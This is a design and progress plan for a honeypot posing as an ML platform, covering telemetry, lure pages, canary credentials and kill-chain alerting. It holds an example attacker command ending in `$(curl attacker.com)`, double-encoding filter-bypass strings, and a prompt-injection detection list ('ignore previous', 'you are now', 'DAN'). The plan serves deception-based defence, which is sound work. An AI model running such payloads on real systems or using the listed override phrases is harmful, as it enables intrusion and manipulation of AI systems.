# Neuro Honeypot — Improvement & Fix Plan

Generated from three-agent audit (frontend deception, backend architect, deployment gatekeeper).
All findings are grounded in the live deployed system on 158.220.110.47.

**Gatekeeper scores (pre-fix):**
- Intelligence Value: 5/10
- Survivability vs bots: 6/10
- Survivability vs human attacker: 2/10

---

## THE BIG THREE (Fix before anything else)

| # | Item | File(s) | Effort | Impact |
|---|---|---|---|---|
| BIG-1 | Register real canarytokens.org tokens for AWS key, WandB key, HF token | No code change | 30 min | Post-exfiltration tracking |
| BIG-2 | Populate `attacker_sessions` table on every `PostgresWriter.write()` call | `log_shipper.py` | 2h | Kill chain provability |
| BIG-3 | Fix hostname contradiction: SSH honeyfs says `neurocore-gpu01`, HTTP says `neuro-train-01` | Cowrie fs.pickle | 10 min | Human attacker survivability |

**Why these three first:** BIG-1 is the only mechanism that tracks attacker behavior after they leave the VPS. BIG-2 makes "we tracked adversaries across the full kill chain" provable — currently the `attacker_sessions` table has the right columns but is entirely empty. BIG-3 is caught by any human attacker within ~10 minutes of comparing the two surfaces.

---

## P0 — Must Fix (Quick wins, high impact)

### ~~P0-1~~: Load `metrics.js` on login page ✓ DONE
- **File:** `frontend-latest/login.html` → add `<script src="/static/js/metrics.js"></script>` to `{% block scripts %}`
- **Gap:** Login page is highest-volume entry point. No canvas fingerprint, no WebRTC LAN IP leak, no mouse movement sampling. `auth.js` loads but not `metrics.js`.
- **Captures:** Canvas fingerprint (browser/OS uniqueness), real LAN IP behind VPN via WebRTC leak, time on page (scanner vs. human), mouse movement absence (automated vs. human)
- **Effort:** 5 min

### ~~P0-2~~: Load `metrics.js` on `admin.html` and `api_keys.html` ✓ DONE
- **File:** `frontend-latest/admin.html`, `frontend-latest/api_keys.html` → same one-line addition
- **Gap:** No canvas fingerprint on admin re-auth. No pagehide dwell on API keys page.
- **Effort:** 5 min

### ~~P0-3~~: Add JS telemetry to `jobs_new.html` ✓ DONE
- **File:** `frontend-latest/jobs_new.html`
- **Gap:** RCE trap page has zero JavaScript. No page-view beacon, no keystroke capture on `startup_script` textarea, no paste event, no pagehide. An attacker typing incremental payloads (`ls` → `whoami` → `$(curl attacker.com)`) has every non-matching submission invisible.
- **What to build:**
  - `DOMContentLoaded` → fire `page_view` beacon
  - Debounced `input` event on `#startup-script` → beacon with content length + sha256 of first 32 chars (not full value)
  - `onsubmit` → fire `form_interaction` beacon with full `startup_script` value before POST
  - `pagehide` → fire beacon with dwell time and whether form was submitted
- **Captures:** Incremental RCE payload construction, paste from exploit cheatsheets, dwell time, abandonment vs. submission
- **Effort:** 1h

### ~~P0-4~~: Add JS telemetry to `artifacts.html` ✓ DONE
- **File:** `frontend-latest/artifacts.html`
- **Gap:** LFI page has zero JavaScript. Download button clicks fire `showToast()` only. Can't distinguish hover from aggressive clicking. Model-manifest download link points to `/api/v1/models` (returns model list) instead of `/api/v1/lure/model-manifest`.
- **What to build:**
  - `DOMContentLoaded` → fire `page_view` beacon
  - Each Download button `onclick` → fire `{event_type: 'artifact_download_click', filename: '...'}` before toast
  - Fix `model-manifest.json` download href to `/api/v1/lure/model-manifest`
  - `pagehide` → fire dwell time beacon
- **Captures:** Specific model files targeted, dwell time, path traversal typing patterns
- **Effort:** 1h

### ~~P0-5~~: Add telemetry to `api_docs.html` filter tags and endpoint expansions ✓ DONE
- **File:** `frontend-latest/api_docs.html`
- **Gap:** `filterTag()` and `toggleEndpoint()` are pure DOM operations — nothing sent to telemetry. This is the highest-intent-signal page: clicking "internal" tag = wants unauthenticated endpoints; expanding `GET /.env` = misconfiguration hunting.
- **What to build:** Add `fetch('/api/v1/telemetry', ...)` inside `filterTag()` with `{event_type: 'docs_filter', tag: tag}` and inside `toggleEndpoint()` with `{event_type: 'endpoint_expanded', method, path}`. Also add `/api/docs` to `_LURE_PATHS` in `main.py`.
- **Captures:** Exact attack vector declared by tag choice, specific endpoints researched, order of exploration
- **Effort:** 1h

### ~~P0-6~~: Fix hostname contradiction ✓ DONE (Session 2 — fs.pickle patched, neurocore-gpu01 → neuro-train-01)
- **File:** Cowrie fs.pickle + SSH banner config
- **Gap:** SSH honeyfs contains `neurocore-gpu01` as hostname. HTTP layer says `neuro-train-01`. Human attacker finds this within ~10 minutes.
- **Fix:** Patch fs.pickle to replace `neurocore-gpu01` with `neuro-train-01` in all fake filesystem files (`/etc/hostname`, `/etc/hosts`, bash history, config files). Update SSH banner if set.
- **Effort:** 10 min

### ~~P0-7~~: Register real canarytokens ✓ DONE (Session 2 — AWS key AKIAYZM57LXRGIYTCOUV registered at canarytokens.org, embedded in /.env, config.yaml, Cowrie fs.pickle)
- **No code change required**
- **Gap:** AWS key `AKIAQF3ZXVN2MPLR8KT4`, WandB key, HuggingFace token in `.env` / `config.yaml` are unregistered props. When attacker exfiltrates and uses them from their real machine, zero notification.
- **Fix:**
  1. Register `AKIAQF3ZXVN2MPLR8KT4` with canarytokens.org "AWS API Key" type — notifies on any AWS API call using this key ID, worldwide, free
  2. Create a real WandB account (`neuro-ai` workspace), generate real API key, enable audit webhook, embed key in lure files
  3. Create a real HuggingFace account, generate real token, embed in lure files — HF provides token usage audit logs
- **Captures:** Attacker behavior after leaving VPS — proves exfiltration + credential replay
- **Effort:** 30 min

---

## P1 — High Value (1–3 hours each)

### ~~P1-1~~: Add `/api/v1/cluster/nodes` endpoint (HTTP→SSH kill chain bridge) ✓ DONE
- **File:** `deploy/module-6-honeypot-api/src/main.py`
- **Gap:** Biggest missing route. An attacker who enumerates the HTTP platform has no natural path to the SSH sensor. Kill chain is broken at HTTP boundary.
- **What to build:**
  ```python
  @app.get("/api/v1/cluster/nodes")
  async def cluster_nodes(request: Request):
      return JSONResponse({
          "cluster": "neuro-train-01",
          "nodes": [
              {"name": "neuro-train-01", "ip": "10.31.4.22", "status": "running",
               "ssh_port": 22, "ssh_fingerprint": "SHA256:k3Yxxx",
               "gpu_util": 87.4, "role": "primary",
               "note": "Direct SSH requires neuro-svc credentials. See /config.yaml."},
              {"name": "neuro-train-02", "ip": "10.31.4.23", "status": "idle", "role": "standby"}
          ]
      })
  ```
  - Add to `_LURE_PATHS`
  - Add to `api_docs.html` endpoint list
  - Reference in dashboard alert banner: *"Node neuro-train-01 reported elevated memory — SSH in to inspect. See /api/v1/cluster/nodes"*
- **Captures:** Attacker copies IP → connects to Cowrie. Creates HTTP-session-to-SSH-session correlation event proving kill chain.
- **Effort:** 1h

### ~~P1-2~~: Add SSH credential cross-references to HTTP layer ✓ DONE
- **Files:** `frontend-latest/jobs_new.html`, `frontend-latest/artifacts.html`, `deploy/module-6-honeypot-api/src/main.py` (`.env` lure)
- **Gap:** No content in the HTTP UI gives an attacker reason to try SSH. The kill chain break is partly a content problem, not just a route problem.
- **What to build:**
  - `jobs_new.html` resource sidebar: `SSH access: neuro-svc@neuro-train-01.internal (key: ~/.ssh/neuro_ed25519)`
  - `artifacts.html` HTML comment: `<!-- TODO: revoke neuro-svc SSH key on neuro-train-01 after Q2 audit — key still active (priya.nair @ 2026-04-10) -->`
  - `.env` lure: add `TRAIN_NODE_SSH_KEY=/home/neuro-svc/.ssh/id_ed25519`
  - `dashboard.html` HTML comment: `<!-- node IPs: neuro-train-01:10.31.4.22, neuro-train-02:10.31.4.23 — internal DNS not yet propagated (IT#5289) -->`
- **Effort:** 45 min

### ~~P1-3~~: Cross-sensor credential correlation in sentinel ✓ DONE
- **File:** `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** An attacker submitting `NeuroAdmin2024!` to HTTP login then trying the same password on Cowrie SSH is the most valuable kill-chain signal the system can produce — currently completely invisible.
- **What to build:** Secondary query in sentinel poll loop:
  ```sql
  SELECT src_ip, password, array_agg(DISTINCT sensor) AS sensors
  FROM honeypot_events
  WHERE password IS NOT NULL
    AND created_at > NOW() - INTERVAL '24 hours'
  GROUP BY src_ip, password
  HAVING COUNT(DISTINCT sensor) > 1;
  ```
  Fire a priority-0 alert with 4-hour per-IP cooldown: *"CREDENTIAL REPLAY DETECTED — {src_ip} used same password across {sensors}"*
- **Effort:** 2h

### ~~P1-4~~: Multi-sensor kill chain alert in sentinel ✓ DONE
- **File:** `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** If an IP hits HTTP + SSH + MariaDB within 60 minutes, three separate cooldown-suppressed alerts arrive. No combined "kill chain traversal" alert.
- **What to build:**
  ```sql
  SELECT src_ip, array_agg(DISTINCT sensor) AS sensors, COUNT(*) AS event_count
  FROM honeypot_events
  WHERE created_at > NOW() - INTERVAL '60 minutes'
  GROUP BY src_ip
  HAVING COUNT(DISTINCT sensor) >= 3;
  ```
  Fire `multi_sensor.kill_chain` alert with 24-hour per-IP cooldown. Fire only when an IP crosses the 3-sensor threshold for the first time (track in sentinel's in-memory seen set).
- **Effort:** 1h

### ~~P1-5~~: Lure credential use triggers priority-0 alert ✓ DONE
- **File:** `deploy/module-6-honeypot-api/src/main.py`, `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** An attacker submitting valid lure credentials is treated as a generic HTTP event subject to the 30-min cooldown. No dedicated alert.
- **What to build:**
  - In `api_auth()`, after lure credential match, set internal response header `X-Lure-Credential-Used: true`
  - Middleware reads header, overrides `event_type` to `http.lure.credential.success`
  - In sentinel: add `http.lure.credential.success` to a `_NO_COOLDOWN_EVENTS` set — every occurrence fires immediately: *"LURE CREDENTIAL USED — {email} / {password} from {src_ip}"*
- **Effort:** 1.5h

### ~~P1-6~~: Populate `attacker_sessions` table ✓ DONE
- **File:** `deploy/module-5-log-shipper/src/log_shipper.py` — `PostgresWriter.write()`
- **Gap:** Schema defines `sensors_hit`, `credentials_tried`, `commands_run`, `threat_score` but nothing writes to this table. The `session_id` FK in `honeypot_events` points to sessions that don't exist.
- **What to build:** After every main INSERT, execute:
  ```sql
  INSERT INTO attacker_sessions (session_id, src_ip, first_seen, last_seen, event_count, sensors_hit)
  VALUES (%s, %s, %s, %s, 1, ARRAY[%s])
  ON CONFLICT (session_id) DO UPDATE
    SET last_seen = EXCLUDED.last_seen,
        event_count = attacker_sessions.event_count + 1,
        sensors_hit = array_append(attacker_sessions.sensors_hit, EXCLUDED.sensors_hit[1])
  WHERE NOT (EXCLUDED.sensors_hit[1] = ANY(attacker_sessions.sensors_hit));
  ```
- **Effort:** 2h

### ~~P1-7~~: Populate `threat_score`, `tags`, `is_tor` columns ✓ DONE (Session 3 — scoring table + tags derived from event_type deployed in log_shipper.py; is_tor stub wired but TOR exit list download not yet live — see CRIT-2 in session-7-plan.md)
- **File:** `deploy/module-5-log-shipper/src/log_shipper.py`
- **Gap:** These columns are schema-defined but always null/false. GIN index on `tags` and index on `threat_score` are completely unused.
- **What to build:**
  - Scoring table: SSH login success=90, file download=85, RCE/LFI attempt=80, SQLi=75, lure credential submit=70, `.env`/`config.yaml` access=60, new IP first contact=30
  - Tags derived from event_type: `cowrie.session.file_download` → `['malware-delivery']`, `http.lfi.attempt` → `['web-attack']`, `cowrie.login.failed` > 10 attempts → `['brute-force']`
  - TOR check: download TOR exit list from `https://check.torproject.org/torbulkexitlist` daily, check `src_ip` at insert time, set `is_tor = true`
- **Effort:** 2h

### ~~P1-8~~: Fix sidebar nav links that return JSON instead of HTML ✓ DONE (Session 5 — /runs, /models, /datasets now render proper Jinja2 templates)
- **File:** `frontend-latest/base.html` + new template files + `main.py`
- **Gap:** Clicking "Runs", "Models", "Datasets" in the nav sidebar drops the user from polished dark UI to raw JSON (`/api/v1/training/jobs`, `/api/v1/models`, `/api/v1/data/datasets`). No real SaaS does this — immediate tell for any attacker who navigates.
- **What to build:** Add HTML routes at `/runs`, `/models`, `/datasets` rendering proper Jinja2 templates with the sidebar and session-gating. Minimum viable: render the same data from the dashboard JS arrays in proper table format. Each page hit is logged separately.
- **Effort:** 3h

### ~~P1-9~~: `bot_score` used in sentinel alerting ✓ DONE (Session 5 — bot_score parsed from payload JSONB, human-like sessions flagged ⚠️ in Telegram alerts)
- **File:** `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** `bot_score` is computed and stored in `payload` JSONB but sentinel never reads it. A human-like session (score < 0.3) and a sqlmap run (score 0.9) get identical alert treatment.
- **What to build:** Include `payload->>'bot_score'` in sentinel's SELECT. Add to alert message body. For sessions where bot_score < 0.3 AND a lure path is accessed, prefix alert: *"POSSIBLE HUMAN ATTACKER"*. This is the most interesting class of events for the pitch.
- **Effort:** 1h

---

## P2 — Depth and Completeness

### ~~P2-1~~: `/notifications` page with SSH node hints ✓ DONE (Session 4 — 8 alerts with SSH kill-chain hints, notification bell dropdown)
- **File:** New `frontend-latest/notifications.html` + `main.py` route
- **What to build:** Page listing 8–10 fake notifications:
  - *"run-001 completed — checkpoint saved to neuro-train-01.internal:/data/checkpoints/run-001/step-5000"* (HIGH: SSH target + path)
  - *"neuro-train-01 — disk at 87% on /data. SSH in to clean up."*
  - *"API key expiry: priya.nair-pipeline expires 2026-06-15"*
  - *"Deployment failed: llama3-8b prod — see /debug/logs"*
  - Add notification bell icon to dashboard with red "3 unread" badge
  - Add to `_LURE_PATHS`
- **Captures:** Dwell time, follow-up SSH attempts triggered by node alert
- **Effort:** 2h

### ~~P2-2~~: `/settings/profile` page with SSH key copy telemetry ✓ DONE (Session 4 — SSH key copy fires ssh_key_copy telemetry beacon)
- **File:** New `frontend-latest/settings_profile.html` + `main.py` route
- **What to build:** Profile page showing:
  - User: Ming Chen, m.chen@neuro.ai
  - SSH Public Key: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake...key== m.chen@neuro-train-01` with Copy button
  - Copy button fires: `{event_type: 'ssh_key_copy', user: 'm.chen'}`
  - *"Your SSH key is authorized on: neuro-train-01.internal, neuro-train-02.internal"*
- **Captures:** SSH key copy event = attacker intends to try key against Cowrie. Strong pivot signal.
- **Effort:** 2h

### ~~P2-3~~: `/settings/security` page — DROPPED (Session 7 — low attack value, cuts into build time)
- **File:** New template + `main.py` route + `POST /api/v1/settings/security/backup-email`
- **What to build:** Shows current 2FA status, "Add backup email" form. POST endpoint logs submitted email to `username` column of `honeypot_events`.
- **Captures:** Attacker's own email address if they use their real one — identity artifact
- **Effort:** 2h

### ~~P2-4~~: `/search` endpoint — DROPPED (Session 7 — superseded by SSRF remote-import which is a stronger, more AI-platform-authentic attack surface)
- **File:** New template + `main.py` route `GET /search?q=...`
- **What to build:** Search bar in dashboard top bar. Returns 3–5 plausible non-functional results. Logs `q` as `{event_type: 'search', query: q}`. `_detect_web_attack()` already handles XSS/SQLi patterns.
- **Captures:** XSS payloads (tool fingerprinting), SQLi payloads (confirms intent), search terms revealing hunting targets ("password", "admin", "secret")
- **Effort:** 1.5h

### ~~P2-5~~: DevTools detection in `metrics.js` ✓ DONE (Session 3 — F12/Ctrl+Shift+I key detection + side-panel polling added)
- **File:** `deploy/module-6-honeypot-api/src/static/js/metrics.js`
- **What to build:**
  ```javascript
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u'))
      fetch('/api/v1/telemetry', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({type:'dev_tools_key', key: e.key, ts: Date.now()})}).catch(function(){});
  });
  // Poll for side-panel open:
  setInterval(function() {
    if (window.outerWidth - window.innerWidth > 160)
      fetch('/api/v1/telemetry', {method:'POST', body: JSON.stringify({type:'devtools_panel_open'})}).catch(function(){});
  }, 1000);
  ```
- **Captures:** Confirms manual human inspection vs. automated scanning — clearest indicator of a skilled attacker
- **Effort:** 30 min

### ~~P2-6~~: Fix `X-Debug-Mode` header scope ✓ DONE (Session 1 — scoped to lure paths only)
- **File:** `deploy/module-6-honeypot-api/src/main.py` middleware
- **Gap:** `X-Debug-Mode: enabled` sent on every response including 404s. No real production app does this globally — a sophisticated security researcher spots this as a honeypot indicator immediately.
- **Fix:** Only add header for routes that are in `_LURE_PATHS` or explicitly in a debug-lure set (`.env`, `config.yaml`, `api/v1/internal/*`). All other routes get normal production headers: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: same-origin`.
- **Effort:** 30 min

### ~~P2-7~~: Add `/.git/config` and `/.git/HEAD` routes ✓ DONE (Session 1 — plain-text responses added)
- **File:** `main.py`
- **Gap:** `/.git/config` in `_LURE_PATHS` returns JSON 404. Attackers doing git repository exposure enumeration expect plain text. Content-type mismatch is detectable.
- **What to build:**
  ```python
  @app.get("/.git/config")
  async def git_config(request: Request):
      return PlainTextResponse("""[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n[remote "origin"]\n\turl = git@github.com:cyvera-ai/neuro-platform.git\n\tfetch = +refs/heads/*:refs/heads/*\n[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n""")

  @app.get("/.git/HEAD")
  async def git_head(request: Request):
      return PlainTextResponse("ref: refs/heads/main\n")
  ```
- **Effort:** 20 min

### ~~P2-8~~: Dataset download button telemetry ✓ DONE (Session 3 — all 5 Download buttons beacon dataset_download_click with filename + classification)
- **File:** `frontend-latest/dashboard.html`
- **Gap:** "CONFIDENTIAL: internal_slack_logs_Q1.jsonl" and "RESTRICTED: medical_records_deidentified.parquet" download buttons call `showToast()` only. Most enticing names on the site — not knowing when they're clicked is a significant gap.
- **What to build:** Change onclick to `downloadDataset(filename, classification)` which beacons `{event_type: 'dataset_download_click', filename, classification}` before toast.
- **Effort:** 30 min

### ~~P2-9~~: API key reveal + stored key replay detection — DROPPED (Session 7 — superseded by canarytoken CSV which covers credential exfiltration story better and with out-of-band tracking)
- **File:** `frontend-latest/api_keys.html`, `main.py`
- **Gap:** Keys are masked with no Reveal toggle. Generated keys are never stored — if attacker replays a key in `Authorization: Bearer` header, it's unrecognizable.
- **What to build:**
  - Add "Reveal" button that fires `{event_type: 'key_reveal', key_name}` beacon and shows full key value
  - Store generated keys in Redis hash: `api_keys:{key} → {created_at, src_ip, session_id}` with 30-day TTL
  - Middleware: check `Authorization: Bearer {key}` against Redis hash. Match → emit `http.canarytoken.api_key_used`
- **Effort:** 2h

### ~~P2-10~~: Kill chain stage state machine ✓ DONE (2026-06-05 — kill_chain_stage column added; _classify_kill_chain_stage in log_shipper.py for SSH/network events; _classify_http_kill_chain_stage in main.py for HTTP events; _check_kill_chain_stages in sentinel.py fires ⚡/💀 alert when session reaches EXECUTION/EXFILTRATION; verified live on VPS)
- **File:** `deploy/module-5-log-shipper/src/log_shipper.py`, schema
- **Gap:** No MITRE ATT&CK stage classification. "Tracked adversaries across full kill chain" is a strong FYP claim — needs automatic classification to prove it.
- **What to build:** Add `kill_chain_stage` column to `attacker_sessions`. State machine in consumer thread:
  - First HTTP GET or TCP probe → `RECON`
  - Login attempt (any sensor) → `INITIAL_ACCESS`
  - SSH `id`/`whoami`/`uname`, or HTTP `/admin/users` access → `DISCOVERY`
  - `.env` / `config.yaml` / `/api/v1/internal/config` access → `CREDENTIAL_ACCESS`
  - `cowrie.session.file_download` or `/jobs/new` RCE → `EXECUTION`
  - `wget`/`curl` to external IP, or `/api/v1/data/download` → `EXFILTRATION`
  - Each transition emits `killchain.transition` event. Sentinel fires priority alert on `EXECUTION` or beyond.
- **Effort:** 3h

### ~~P2-11~~: `settings/workspace` as proper HTML page — DROPPED (Session 7 — low demo value, cuts into 2-day build window)
- **File:** New `settings_workspace.html` + `main.py`
- **Gap:** `GET /settings/workspace` returns raw JSON. Settings nav link leads to JSON context-switch — obvious tell.
- **What to build:** Render a proper settings page: workspace name, region, tier, team member list, "Change tier" form that fires telemetry.
- **Effort:** 2h

### ~~P2-12~~: Fix `api_docs.html` consistency issues ✓ DONE (Session 1 — domain/SSO/route-count fixes applied)
- **File:** `frontend-latest/api_docs.html`
- **Gaps:**
  - Base URL shows `neurodata.me` (old domain) — change to `neuro.cyveera.com`
  - Says "Microsoft SSO" — login page has Google Workspace SSO button — change to Google Workspace in docs
  - Says "47 routes registered" but ~35 actually exist — update count or add stub routes
- **Effort:** 30 min

### ~~P2-13~~: Footer on all authenticated pages ✓ DONE (Session 1 — footer block added to base.html)
- **File:** `frontend-latest/base.html`
- **Gap:** All authenticated pages have no footer. Real SaaS platforms always do.
- **What to build:** `© 2025 Cyvera AI Infrastructure Ltd · Neuro v2.3.1 · Terms · Privacy · Status` — Terms/Privacy routes already exist. Status links to new `/status` stub.
- **Effort:** 30 min

### ~~P2-14~~: `admin.html` username from session, not hardcoded ✓ DONE (Session 7 — _SESSION_USER_MAP populated on lure credential login; admin_page reads from map with m.chen fallback; admin.html pre-fills and locks username field via {{ current_user }})
- **File:** `main.py` `GET /admin`, `api_auth()`, `frontend-latest/admin.html`
- **Gap:** Admin re-auth always shows `m.chen@neuro.ai` regardless of which persona's credentials were used.
- **Fix:** On POST `/api/v1/auth` success, write `session:{session_id}:user → email` to Redis. Read it back in `GET /admin`, pass as `current_user` to template.
- **Effort:** 1h

---

## P3 — Extended Coverage (Half-day+ each)

### ~~P3-1~~: IP reputation enrichment pipeline ✓ DONE (2026-06-05 — TOR exit list refresh thread in log_shipper.py; _refresh_tor_list() downloads from torproject.org every 6h; _is_tor() used in PostgresWriter.write(); sentinel shows 🧅 on TOR attacker alerts)
- **Files:** `log_shipper.py`, new `ip_reputation` table
- **What to build:** Background enrichment worker (runs every 6h):
  - Download TOR exit list daily from torproject.org (~7KB), check IPs at insert time
  - AbuseIPDB free API (1000 lookups/day) for `abuseConfidenceScore` on unique IPs
  - Store in `ip_reputation` table: `ip`, `is_tor`, `is_vpn`, `abuse_score`, `is_known_scanner`, `last_checked`
  - UPDATE corresponding `honeypot_events` rows to set `is_tor`, `tags`
- **Effort:** 3h

### ~~P3-2~~: Prompt injection detection ✓ DONE (2026-06-05 — _PROMPT_INJECTION_PATTERNS list; /api/v1/inference POST handler detects and logs http.prompt.injection with matched pattern + body preview; sentinel: 🤖 PROMPT INJECTION ATTEMPT header)
- **File:** `main.py`
- **What to build:** `_PROMPT_INJECTION_PATTERNS` list: `"ignore previous"`, `"disregard all"`, `"system prompt"`, `"you are now"`, `"jailbreak"`, `"DAN"`, `"act as"`. Detected patterns on `/api/v1/inference` → emit `http.prompt.injection` event type. Sentinel: high-priority alert category.
- **Captures:** AI-specific attacker sophistication — attacker believes this is a real LLM API
- **Effort:** 2h

### P3-3: SMB sensor via OpenCanary ⚠️ REVERTED (2026-06-05 — CRIT-R28-1: OpenCanary SMB module requires running Samba/smbd with full_audit VFS; Dockerfile has no samba; dark port 445 is a honeypot fingerprint tell worse than no SMB at all. smb.enabled=false, port 445 DNAT removed from honeypot-dnat.sh. To deploy properly: add samba to Dockerfile, ship smb.conf with vfs objects=full_audit, bind 445 in compose, verify smbclient -L event in opencanary.json.)
- **File:** `deploy/module-3-opencanary/opencanary.conf.example`, `honeypot-dnat.sh`
- **What to build:** Enable `"smb.enabled": true, "smb.port": 445`. Fake NetBIOS name `NEUROCORE-GPU01`, share name `datasets`. Add DNAT rule for port 445. OpenCanary logs NTLM challenge/response (logtype 8000/8001).
- **Captures:** Windows domain credentials (NTLM hashes) — highest-value credential surface for Windows attackers
- **Effort:** 2h

### ~~P3-4~~: SMTP minimal listener ✓ CODED — ⚠️ DEPLOYMENT DEFERRED (2026-06-05 — Gatekeeper verdict: CONDITIONAL/DEFER. Cover story mismatch: ML platform with Google Workspace SSO has no reason to run inbound MX. Open relay abuse risk: `250 Ok: queued` after DATA could trigger Spamhaus/Contabo abuse on shared VPS. Postfix banner without STARTTLS is instant tell. Code complete at deploy/module-8-smtp-lure/ but NOT deployed. To deploy later: reject after DATA, add STARTTLS stub, reframe as submission port 587, align banner domain to neuro.cyveera.com, revert DNAT port 25 to OpenCanary or leave disabled.)
- **What to build:** Minimal Python asyncio SMTP listener speaking ESMTP (220/250/354/550). Captures MAIL FROM, RCPT TO, DATA body. Logs to file tailed by log-shipper.
- **Captures:** VRFY/EXPN user enumeration, spam relay attempts, phishing payloads
- **Effort:** 3h

### ~~P3-5~~: Jupyter stub externally exposed ✓ DONE (2026-06-05 — nginx /jupyter/ location proxies to honeypot-api:8888 with WebSocket support; redirect /jupyter → /jupyter/; jupyter_stub.py form action fixed to /jupyter/login)
- **File:** `deploy/module-7-nginx/config/neuro.conf`, `jupyter_stub.py`
- **Gap:** `jupyter_stub.py` runs on loopback :8888 only — invisible to external attackers. Jupyter unauthenticated RCE is actively exploited against ML infrastructure.
- **Fix:** Expose via nginx at `/jupyter` path prefix with token auth. Capture attempted token values and notebook execution POSTs.
- **Effort:** 2h

### P3-6: `/notifications`, `/settings/profile`, `/settings/security`, `/status` pages
- Already detailed in P2-1, P2-2, P2-3 above
- Bundle as a single frontend session: create all four templates + routes together
- **Effort:** 4h total

### ~~P3-7~~: Fake team activity feed — DROPPED (Session 7 — not a sensor, no attack capture value)
- **File:** `frontend-latest/dashboard.html`
- **Gap:** No recent activity visible anywhere. Absence of team activity is a subtle tell for a platform with no real users.
- **What to build:** "Recent Activity" card in dashboard overview:
  - *"priya.nair deployed mistral-7b-rlhf to inference cluster · 4h ago"*
  - *"m.chen started run-007 · 8h ago"*
  - *"svc-deploy exported model manifest · 2026-05-22 03:17"*
  - `onclick` on each item → `{event_type: 'activity_item_clicked', item: ...}` beacon
- **Effort:** 1h

### ~~P3-8~~: Support ticket widget — DROPPED (Session 7 — not a sensor, no attack capture value)
- **File:** `main.py`, `frontend-latest/dashboard.html`
- **What to build:** `?` help icon in dashboard top-right → modal with "Contact IT Support — describe your issue" textarea. `POST /api/v1/support/ticket` logs body field. Response: `{"ticket_id": "IT-8831", "message": "Response within 2 business days."}`.
- **Captures:** Free-text attacker notes, possible native language (attribution signal), operational errors revealing intent
- **Effort:** 1.5h

### ~~P3-9~~: Double URL-encoding bypass fix for `_detect_web_attack()` ✓ DONE (Session 7 — urllib.parse.unquote_plus() applied twice in _detect_web_attack() before pattern matching)
- **File:** `main.py`
- **Gap:** `%2527` → `%27` → `'` (double-encoded SQLi) bypasses all pattern matching. Unicode normalization variants (`%c0%af`, `%ef%bc%8f`) also bypass LFI patterns.
- **Fix:** Apply `urllib.parse.unquote_plus()` twice before pattern matching. Add Unicode normalization sequences to `_LFI_PATTERNS`.
- **Effort:** 1h

### ~~P3-10~~: MariaDB credential relay detection ✓ DONE (2026-06-05 — _check_mariadb_credential_relay() in log_shipper.py; fires on MariaDB connect if same IP read config.yaml over SSH in last 30m; emits cross_sensor.credential_relay event; sentinel: 🔗🔑 CREDENTIAL RELAY header, always alert)
- **File:** `log_shipper.py` consumer thread
- **Gap:** Attacker SSHes in, `cat`s `~/.config/neuro/config.yaml`, then connects to MariaDB with that password — two unlinked events. The "credential relay" signal is invisible.
- **Fix:** When processing a MariaDB connect event, query recent Cowrie `command.input` events from same `src_ip` containing `config.yaml` within last 30 minutes. If found, add `cross_sensor_link` to the MariaDB event payload, emit a `cross_sensor.credential_relay` event.
- **Effort:** 2h

---

## Implementation Order Summary

```
Week 1 — P0 (total ~6h):
  [ ] BIG-3: Fix hostname contradiction (10 min)
  [ ] BIG-1: Register canarytokens (30 min)
  [ ] P0-1 + P0-2: Load metrics.js on login/admin/api_keys (15 min)
  [ ] P0-3: JS telemetry on jobs_new.html (1h)
  [ ] P0-4: JS telemetry on artifacts.html (1h)
  [ ] P0-5: api_docs telemetry + _LURE_PATHS (1h)
  [ ] P2-5: DevTools detection in metrics.js (30 min)
  [ ] P2-7: /.git/config and /.git/HEAD routes (20 min)
  [ ] P2-6: Scope X-Debug-Mode header (30 min)

Week 2 — P1 Backend (total ~12h):
  [ ] BIG-2: Populate attacker_sessions table (2h)
  [ ] P1-3: Cross-sensor credential correlation (2h)
  [ ] P1-4: Multi-sensor kill chain alert (1h)
  [ ] P1-5: Lure credential priority-0 alert (1.5h)
  [ ] P1-7: Populate threat_score + tags + is_tor (2h)
  [ ] P1-9: bot_score used in sentinel alerting (1h)
  [ ] P2-10: Kill chain stage state machine (3h)

Week 3 — P1/P2 Frontend (total ~10h):
  [ ] P1-1: /api/v1/cluster/nodes endpoint (1h)
  [ ] P1-2: SSH credential cross-references in HTTP layer (45 min)
  [ ] P1-8: Fix sidebar nav JSON links → HTML pages (3h)
  [ ] P2-1: /notifications page (2h)
  [ ] P2-2: /settings/profile page (2h)
  [ ] P2-12: Fix api_docs consistency (30 min)
  [ ] P2-13: Footer on authenticated pages (30 min)

Week 4 — P2/P3 Extended:
  [ ] P2-9: API key reveal + replay detection (2h)
  [ ] P3-6: /settings/security + /status pages (2h)
  [ ] P3-7: Team activity feed (1h)
  [ ] P3-8: Support ticket widget (1.5h)
  [ ] P3-10: MariaDB credential relay detection (2h)
  [ ] P3-3: SMB sensor (2h)
  [ ] P3-1: IP reputation enrichment (3h)
```

---

## Files Changed Per Module

| Module | Files | Changes |
|---|---|---|
| Frontend templates | `frontend-latest/*.html` | metrics.js loading, telemetry blocks, nav links, footers, new pages |
| `main.py` | `deploy/module-6-honeypot-api/src/main.py` | New routes, session username, debug header scope, canarytoken key storage |
| `metrics.js` | `deploy/module-6-honeypot-api/src/static/js/metrics.js` | DevTools detection |
| `log_shipper.py` | `deploy/module-5-log-shipper/src/log_shipper.py` | attacker_sessions write, threat_score/tags, kill chain state machine, credential relay detection |
| `sentinel.py` | `deploy/module-5-log-shipper/src/sentinel.py` | Priority alerts, multi-sensor query, bot_score usage, credential correlation |
| Cowrie | fs.pickle, cowrie.cfg | Hostname fix |
| OpenCanary | `opencanary.conf.example` | SMB enable (P3) |
| DNAT | `honeypot-dnat.sh` | Port 445 for SMB (P3) |
| Schema | PostgreSQL migrations | kill_chain_stage column, ip_reputation table (P3) |
